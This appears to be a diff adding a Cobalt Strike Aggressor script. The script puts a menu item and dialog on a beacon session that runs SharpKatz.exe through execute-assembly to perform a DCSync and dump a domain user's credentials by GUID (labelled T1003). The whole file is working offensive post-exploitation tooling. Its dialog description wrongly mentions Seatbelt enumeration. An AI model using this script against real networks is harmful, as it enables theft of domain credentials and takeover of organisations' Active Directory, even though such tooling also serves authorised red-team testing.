@@ -1,0 +1,26 @@
+item "SharpKatz Dump User Credential By GUID - T1003"{
+	local('$bid');
+		foreach $bid ($1){
+			skdcsyncguid($bid);
+		}
+	}
+	
+sub skdcsyncguid{
+ $bid = $1;
+    $dialog = dialog("SharpKatz Dump Credential By GUID", %(guid => "", fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "--Command dcsync --Guid $3['guid'] --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Dumping Creds...');
+            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
+    drow_text($dialog, "guid",  "Please Enter A GUID:");
+    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
+    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}
+	
